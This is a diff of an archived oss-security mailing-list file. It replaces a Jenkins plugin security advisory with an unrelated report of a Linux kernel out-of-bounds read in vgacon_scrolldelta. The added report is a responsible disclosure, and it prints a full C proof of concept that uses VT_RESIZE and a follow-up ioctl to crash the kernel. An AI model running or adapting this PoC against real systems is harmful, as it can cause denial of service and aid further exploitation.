@@ -1,75 +1,44 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/12/03/2
-Message-Id: <6A75EEA9-CCEB-432D-9D2E-AB8F66A325F0@beckweb.net>
-Date: Thu, 3 Dec 2020 16:22:46 +0100
-From: Daniel Beck <ml@...kweb.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/09/16/1
+Message-ID: <CA+-U7QDboXJEpHXNa5mk-pOyBbKw63t8WefV5cmr+Hi8KsWeOQ@mail.gmail.com>
+Date: Wed, 16 Sep 2020 16:19:46 +0800
+From: NopNop Nop <nopitydays@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Multiple vulnerabilities in Jenkins
+Subject: Linux Kernel: out-of-bounds reading in vgacon_scrolldelta
 Content-Type: text/plain; charset=utf-8
 
-Jenkins is an open source automation server which enables developers around
-the world to reliably build, test, and deploy their software.
+Hi,
 
-The following releases contain fixes for security vulnerabilities:
+We found a out-of-bounds reading in vgacon_scrolldelta. This BUG is caused
+by "soff" being negative after VT_RESIZE.
 
-* Chaos Monkey Plugin 0.4 and 0.4.1
-* CVS Plugin 2.17
-* Plugin Installation Manager Tool 2.2.0
-* Shelve Project Plugin 3.1
+Our PoC (panic with CONFIG_KASAN=y):
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
 
-Summaries of the vulnerabilities are below. More details, severity, and
-attribution can be found here:
-https://www.jenkins.io/security/advisory/2020-12-03/?
+int main(int argc, char** argv)
+{
+        int fd = open("/dev/tty1", O_RDWR, 0);
 
-We provide advance notification for security updates on this mailing list:
-https://groups.google.com/d/forum/jenkinsci-advisories
+        unsigned short size[3] = {4, 0x254, 0};
+        ioctl(fd, 0x5609, size);
 
-If you discover security vulnerabilities in Jenkins, please report them as
-described here:
-https://www.jenkins.io/security/#reporting-vulnerabilities
+        for (int i = 0; i < 110; i++) {
+                write(fd, "\x0a", 1);
+        }
+        signed int args[3] = {13, -0x400, 0};
+        ioctl(fd, 0x541c, args);
+}
 
----
+Here is the commit to patch this BUG:
+https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=973c096f6a85e5b5f2a295126ba6928d9a6afd45
 
-SECURITY-2146 / CVE-2020-2324
-CVS Plugin 2.16 and earlier does not configure its XML parser to prevent
-XML external entity (XXE) attacks.
+Regards,
+Nop
 
-This allows attackers able to control an agent process to have Jenkins
-parse a crafted changelog file that uses external entities for extraction
-of secrets from the Jenkins controller or server-side request forgery.
-
-
-SECURITY-1856 / CVE-2020-2320
-Plugin Installation Manager Tool is part of the Jenkins project Docker
-images. As `jenkins-plugin-cli` it is used to download and install plugins
-even before Jenkins is running.
-
-Plugin Installation Manager Tool 2.1.3 and earlier does not verify plugin
-downloads. This may allow third parties such as mirror operators to provide
-crafted plugin downloads.
-
-
-SECURITY-2108 / CVE-2020-2321
-Shelve Project Plugin 3.0 and earlier does not require POST requests for
-HTTP endpoints, resulting in cross-site request forgery (CSRF)
-vulnerabilities.
-
-These vulnerabilities allow attackers to shelve, unshelve, or delete a
-project.
-
-
-SECURITY-2109 (1) / CVE-2020-2322
-Chaos Monkey Plugin 0.3 and earlier does not perform permission checks in
-several HTTP endpoints.
-
-This allows attackers with Overall/Read permission to generate load and to
-generate memory leaks.
-
-
-SECURITY-2109 (2) / CVE-2020-2323
-Chaos Monkey Plugin 0.4 and earlier does not perform permission checks in
-an HTTP endpoint.
-
-This allows attackers with Overall/Read permission to access the Chaos
-Monkey page and to see the history of actions.
